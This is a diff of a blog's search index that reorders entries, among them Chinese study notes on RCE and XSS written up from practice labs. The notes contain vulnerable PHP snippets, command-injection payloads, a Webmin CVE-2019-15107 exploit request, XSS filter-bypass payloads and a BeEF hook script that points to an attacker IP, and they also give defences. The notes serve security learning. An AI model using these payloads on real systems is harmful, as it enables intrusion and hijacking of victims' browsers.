@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello！</title>
+    <url>/2026/05/19/hello-world/</url>
+    <content><![CDATA[欢迎来到我的博客！这是我的第一篇文章。
+关于我你好，我是 Jasmine_Iris。
+关于这个博客这里会记录我的学习、思考和分享。
+感谢你的来访 ~
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>数据库基础</title>
     <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
@@ -268,18 +280,6 @@ SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
       </tags>
   </entry>
   <entry>
-    <title>Hello！</title>
-    <url>/2026/05/19/hello-world/</url>
-    <content><![CDATA[欢迎来到我的博客！这是我的第一篇文章。
-关于我你好，我是 Jasmine_Iris。
-关于这个博客这里会记录我的学习、思考和分享。
-感谢你的来访 ~
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CSRF与SSRF漏洞</title>
     <url>/2026/06/08/CSRF-SSRF/index/</url>
     <content><![CDATA[一、CSRF（跨站请求伪造）1. 简介与危害
@@ -479,446 +479,6 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
       <tags>
         <tag>CSRF</tag>
         <tag>SSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE漏洞</title>
-    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、RCE简介与危害
-RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
-成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
-危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
-案例：
-
-
-远程代码执行（eval函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
-
-测试payload：
-
-http://localhost/1.php?x=phpinfo();
-http://localhost/1.php?x=echo%20abc;
-
-
-
-
-
-
-远程命令执行（system函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
-
-测试payload
-
-http://localhost/2.php?x=ipconfig
-
-
-
-
-http://localhost/2.php?x=whoami
-
-
-二、墨者学院靶场https://mozhe.cn/
-案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
-
-
-
-页面输入127.0.0.1正常ping
-
-
-
-
-确认系统
-
-
-
-
-前端JS限制IP格式，前端过滤可绕过。
-
-
-
-
-Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
-
-
-
-
-查看返回目录：index.php、key_xxxx.php。
-
-
-
-
-最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
-
-
-
-
-注：命令分隔符有|、||、&amp;、&amp;&amp;、;
-
-案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
-
-
-
-
-
-解析代码，使⽤php
-
-注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
-&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
-
-新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
-
-
-PHP中内容反引号内内容会被当作系统shell命令执行。
-&lt;?phpecho `$_REQUEST[a]`;?&gt;
-
-
-payload1：?a=ls 列出当前目录，发现key文件。
-
-
-
-
-payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
-
-
-
-案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
-https://mozhe.cn/bug/detail/309
-(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
-
-漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
-(3) 操作
-
-
-
-
-
-
-
-
-
-
-登录拦截
-
-
-
-
-漏洞测试：利用数据包
-
-POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
-
-Host: 靶机IP:端口	改成自己的
-常用 Payload
-
-old=test|id 执行id查看当前用户
-old=test|ls / 列出根目录文件
-old=test|cat /key.txt 读取根目录key
-
-
-
-
-获取 cookie
-
-
-
-
-
-
-
-案例4 PbootCMS代码执行漏洞
-
-(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
-审计⼯具查询危险函数：
-
-
-
-
-
-
-
-
-eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
-
-(2) 操作
-在线留言
-
-
-
-AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
-
-
-
-
-
-
-
-
-登录后台：admin.php
-
-
-
-账号：admin 密码：1234556
-
-
-
-
-
-访问首页：http://localhost/pcms/index.php/about/10.html
-POST传参：1=phpinfo();，触发eval执行代码。
-
-
-
-
-三、RCE漏洞防御方案
-危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
-尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
-若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
-
-
-四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
-remote code execution 远程代码执行
-Q2：命令执行漏洞的危害是什么？执行系统命令
-权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
-查看权限的命令
-Linux 查看权限：id
-Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
-Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
-Q4：如果给源代码，如何进行代审？通过找命令执行函数
-例如：
-
-system：执行系统命令，自带输出结果。
-shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
-例如： echo shell_exec($cmd);
-
-
-exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
-例如： echo exec($cmd);
-
-
-passthru：执行系统命令，自带输出结果。
-popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
-&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
-
-Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
-Q6：如何反弹 shell？
-nc 反弹 shell
-bash 反弹 shell
-（Windows）powershell 反弹shell	Online - Reverse Shell Generator
-
-Q7：如何修复 RCE 漏洞？
-后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
-php 自带函数（禁用）PHP: escapeshellarg - Manual
-在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS漏洞</title>
-    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
-（2）危害
-盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
-控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
-盗窃企业重要的具有商业价值的资料
-非法转账
-强制发送电子邮件
-网站挂马
-控制受害者机器向其它网站发起攻击（重定向语句）
-窃取cookie的sessionid，冒充登录
-
-
-二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
-1. 反射型（1）反射型流程
-黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
-客户端向URL对应的服务器发出请求
-服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
-客户端解析代码，恶意代码随之执行
-
-
-
-（2）案例
-编写代码
-
-把 php 文件放在 phpstudy 的 www 目录下
-&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
-
-访问
-?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-fofa搜索命令
-
-&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
-
-
-
-
-
-进入 pikachu 靶场
-如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
-pikachu靶场：反射型XSS 练习
-
-反射型xss
-
-
-
-先输入 1 测试
-
-
-输入恶意代码
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-方法一：
-直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
-
-
-
-
-方法二：
-直接在输入框里输入恶意代码，但是我们发现会有长度限制：
-
-
-F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
-
-
-
-
-注意：改完之后不要刷新，不然又会恢复 20。
-
-
-总结：输入框长度限制可通过修改URL或F12改前端代码绕过
-2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
-以 pikachu 靶场为例：
-
-
-传入一个恶意代码
-&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
-
-
-
-只要刷新这个页面，就会重复出现这句话。
-3. DOM型（1）流程
-黑客诱导用户点击恶意URL
-
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-客户端直接执行攻击代码，无需与服务器交互
-攻击纯粹发生在客户端
-
-
-
-以 pikachu 靶场为例：
-
-
-先输入 1 测试一下
-
-
-传入一个恶意代码：
-#&#x27; onclick=&quot;alert(1)&quot;
-
-
-
-点击之后：
-
-
-4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
-BeEF是Kali自带的XSS利用工具，基于Ruby开发。
-
-
-（1）核心信息
-Web UI：http://127.0.0.1:3000/ui/panel
-Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-（2）攻击流程
-黑客（Kali）IP 放入 Hook 代码中
-
-&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
-
-
-注入Hook代码到表单提交入库
-
-
-
-
-
-
-受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
-
-
-三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
-http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
-
-2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
-3. 手工绕过（1）标签语法替换
-audio标签
-
-&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
-
-
-video标签
-
-&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
-
-
-button标签
-
-&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
-
-（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
-
-4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
-（1）常用参数XSStrike
--h, --help显示帮助信息
--u, --url指定目标 URL
---dataPOST 方式提交内容
--v, --verbose详细输出
--f, --file加载自定义 payload 字典
--t, --threads定义线程数
--l, --level爬行深度
--t, --encode定义 payload 编码方式
---json将 POST 数据视为 JSON
---path测试 URL 路径组件
---seeds从文件中测试、抓取 URL
---fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
---update更新工具
---timeout设置超时时间
---params指定参数
---crawl爬行目标网站
---proxy使用代理
---blind盲测试
---skip跳过确认提示
---skip-dom跳过 DOM 扫描
---headers提供 HTTP 标头
--d, --delay设置请求延迟
-
-（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
-
-（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-
-
-四、总结Q1：XSS 是什么？跨站脚本攻击
-Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
-Q3：XSS有什么危害？1、获取浏览器的其他信息
-2、窃取浏览器的敏感信息
-3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
-Q4：怎么修复 XSS漏洞？过滤常见关键字
-Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>XSS</category>
-      </categories>
-      <tags>
-        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
@@ -1505,6 +1065,446 @@ admin&#39;#的密码没变，修改的是admin的密码
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE漏洞</title>
+    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、RCE简介与危害
+RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
+成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
+危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
+案例：
+
+
+远程代码执行（eval函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
+
+测试payload：
+
+http://localhost/1.php?x=phpinfo();
+http://localhost/1.php?x=echo%20abc;
+
+
+
+
+
+
+远程命令执行（system函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
+
+测试payload
+
+http://localhost/2.php?x=ipconfig
+
+
+
+
+http://localhost/2.php?x=whoami
+
+
+二、墨者学院靶场https://mozhe.cn/
+案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
+
+
+
+页面输入127.0.0.1正常ping
+
+
+
+
+确认系统
+
+
+
+
+前端JS限制IP格式，前端过滤可绕过。
+
+
+
+
+Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
+
+
+
+
+查看返回目录：index.php、key_xxxx.php。
+
+
+
+
+最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
+
+
+
+
+注：命令分隔符有|、||、&amp;、&amp;&amp;、;
+
+案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
+
+
+
+
+
+解析代码，使⽤php
+
+注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
+&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
+
+新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
+
+
+PHP中内容反引号内内容会被当作系统shell命令执行。
+&lt;?phpecho `$_REQUEST[a]`;?&gt;
+
+
+payload1：?a=ls 列出当前目录，发现key文件。
+
+
+
+
+payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
+
+
+
+案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
+https://mozhe.cn/bug/detail/309
+(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
+
+漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
+(3) 操作
+
+
+
+
+
+
+
+
+
+
+登录拦截
+
+
+
+
+漏洞测试：利用数据包
+
+POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
+
+Host: 靶机IP:端口	改成自己的
+常用 Payload
+
+old=test|id 执行id查看当前用户
+old=test|ls / 列出根目录文件
+old=test|cat /key.txt 读取根目录key
+
+
+
+
+获取 cookie
+
+
+
+
+
+
+
+案例4 PbootCMS代码执行漏洞
+
+(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
+审计⼯具查询危险函数：
+
+
+
+
+
+
+
+
+eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
+
+(2) 操作
+在线留言
+
+
+
+AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
+
+
+
+
+
+
+
+
+登录后台：admin.php
+
+
+
+账号：admin 密码：1234556
+
+
+
+
+
+访问首页：http://localhost/pcms/index.php/about/10.html
+POST传参：1=phpinfo();，触发eval执行代码。
+
+
+
+
+三、RCE漏洞防御方案
+危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
+尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
+若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
+
+
+四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
+remote code execution 远程代码执行
+Q2：命令执行漏洞的危害是什么？执行系统命令
+权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
+查看权限的命令
+Linux 查看权限：id
+Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
+Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
+Q4：如果给源代码，如何进行代审？通过找命令执行函数
+例如：
+
+system：执行系统命令，自带输出结果。
+shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
+例如： echo shell_exec($cmd);
+
+
+exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
+例如： echo exec($cmd);
+
+
+passthru：执行系统命令，自带输出结果。
+popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
+&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
+
+Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
+Q6：如何反弹 shell？
+nc 反弹 shell
+bash 反弹 shell
+（Windows）powershell 反弹shell	Online - Reverse Shell Generator
+
+Q7：如何修复 RCE 漏洞？
+后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
+php 自带函数（禁用）PHP: escapeshellarg - Manual
+在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS漏洞</title>
+    <url>/2026/06/08/XSS%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、XSS简介与危害（1）定义跨站脚本攻击XSS（Cross Site Scripting），为避免与层叠样式表（CSS）缩写混淆，故缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
+（2）危害
+盗取各类用户账号，如机器登录帐号、用户网银帐号、各类管理员帐号
+控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
+盗窃企业重要的具有商业价值的资料
+非法转账
+强制发送电子邮件
+网站挂马
+控制受害者机器向其它网站发起攻击（重定向语句）
+窃取cookie的sessionid，冒充登录
+
+
+二、反射型与存储型XSSXSS攻击可分为三类：反射型、存储型、DOM型，易混淆的是反射和DOM类型。
+1. 反射型（1）反射型流程
+黑客诱导用户点击恶意URL：xxxxxxx.com/?xxx=&lt;script&gt;恶意代码&lt;/script&gt;
+客户端向URL对应的服务器发出请求
+服务器将恶意代码从URL中取出，拼接在HTML中返回给浏览器
+客户端解析代码，恶意代码随之执行
+
+
+
+（2）案例
+编写代码
+
+把 php 文件放在 phpstudy 的 www 目录下
+&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;
+
+访问
+?x=1?x=&lt;script&gt;alert(1)&lt;/script&gt;?x=&lt;script&gt;alert(&#x27;已入侵你后端系统&#x27;)&lt;/script&gt;?x=&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+fofa搜索命令
+
+&quot;pikachu&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp; title=&quot;Get the pikachu&quot;
+
+
+
+
+
+进入 pikachu 靶场
+如果 fofa 访问失败，可以自己搭建pikachu靶场**。**
+pikachu靶场：反射型XSS 练习
+
+反射型xss
+
+
+
+先输入 1 测试
+
+
+输入恶意代码
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+方法一：
+直接在 URL 中修改 message 的值。因为根据测试结果来看，我们输入的 1 实际上是 message 的值。
+
+
+
+
+方法二：
+直接在输入框里输入恶意代码，但是我们发现会有长度限制：
+
+
+F12，发现可以输入的最大长度是 20，那我们就可以把它的数值改大一点。
+
+
+
+
+注意：改完之后不要刷新，不然又会恢复 20。
+
+
+总结：输入框长度限制可通过修改URL或F12改前端代码绕过
+2. 存储型攻击数据存储在服务器，攻击持续生效，危害比反射型更大。
+以 pikachu 靶场为例：
+
+
+传入一个恶意代码
+&lt;h1 style=&#x27;font-size: 10vw;&#x27;&gt;你已被入侵啦,遭到破坏！&lt;/script&gt;&lt;/h1&gt;
+
+
+
+只要刷新这个页面，就会重复出现这句话。
+3. DOM型（1）流程
+黑客诱导用户点击恶意URL
+
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+客户端直接执行攻击代码，无需与服务器交互
+攻击纯粹发生在客户端
+
+
+
+以 pikachu 靶场为例：
+
+
+先输入 1 测试一下
+
+
+传入一个恶意代码：
+#&#x27; onclick=&quot;alert(1)&quot;
+
+
+
+点击之后：
+
+
+4. BeEF-XSS工具使用具体使用：beef-xss详细教程-CSDN博客
+BeEF是Kali自带的XSS利用工具，基于Ruby开发。
+
+
+（1）核心信息
+Web UI：http://127.0.0.1:3000/ui/panel
+Hook代码：&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+（2）攻击流程
+黑客（Kali）IP 放入 Hook 代码中
+
+&lt;script src=&quot;http://192.168.23.131:3000/hook.js&quot;&gt;&lt;/script&gt;
+
+
+注入Hook代码到表单提交入库
+
+
+
+
+
+
+受害者访问页面被Hook，BeEF控制台可控制浏览器（如重定向）
+
+
+三、XSS的绕过技巧与修复1. 未开启WAF直接URL注入：
+http://localhost/1.php?x=%3Cscript%3Ealert(1)%3C/script%3E
+
+2. 开启WAF（安全狗）请求被拦截，提示“带有不合法参数”。
+3. 手工绕过（1）标签语法替换
+audio标签
+
+&lt;audio src=x onerror=alert(47)&gt;&lt;audio src=x onerror=prompt(1);&gt;&lt;audio src=1 href=1 onerror=javascript:alert(1)&gt;
+
+
+video标签
+
+&lt;video src=x onerror=prompt(1);&gt;&lt;video src=x onerror=alert(48)&gt;
+
+
+button标签
+
+&lt;button onfocus=alert(1) autofocus&gt;&lt;button/onclick=alert(1)&gt;xss&lt;/button&gt;
+
+（2）加密算法&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;# 97,108,101,114,116,40,49,41 = alert(1)
+
+4. XSStrike工具可识别并绕过WAF的XSS扫描工具，项目地址：https://github.com/s0md3v/XSStrike
+（1）常用参数XSStrike
+-h, --help显示帮助信息
+-u, --url指定目标 URL
+--dataPOST 方式提交内容
+-v, --verbose详细输出
+-f, --file加载自定义 payload 字典
+-t, --threads定义线程数
+-l, --level爬行深度
+-t, --encode定义 payload 编码方式
+--json将 POST 数据视为 JSON
+--path测试 URL 路径组件
+--seeds从文件中测试、抓取 URL
+--fuzzer测试过滤器和 Web 应用程序防火墙（WAF）
+--update更新工具
+--timeout设置超时时间
+--params指定参数
+--crawl爬行目标网站
+--proxy使用代理
+--blind盲测试
+--skip跳过确认提示
+--skip-dom跳过 DOM 扫描
+--headers提供 HTTP 标头
+-d, --delay设置请求延迟
+
+（2）使用示例# 安装依赖pip install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/# Fuzz测试python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot; --fuzzer# 直接探测python xsstrike.py -u &quot;http://localhost/1.php?x=1&quot;
+
+（3）优化测试页面&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎&lt;/h1&gt;&lt;?php$xss = $_GET[&#x27;x&#x27;];echo $xss;?&gt;&lt;center&gt;测试XSS&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+四、总结Q1：XSS 是什么？跨站脚本攻击
+Q2：XSS的产生原因是什么？后端开发没有对用户传入的参数做严格的限制或过滤，直接输出了用户传入的参数，导致用户传入的参数被浏览器当作 javascript 执行。
+Q3：XSS有什么危害？1、获取浏览器的其他信息
+2、窃取浏览器的敏感信息
+3、劫持浏览器（用  BeEF ，了解常用功能，比如：重定向redirect、）
+Q4：怎么修复 XSS漏洞？过滤常见关键字
+Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密算法，最后使用产生随机码。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
       </tags>
   </entry>
   <entry>
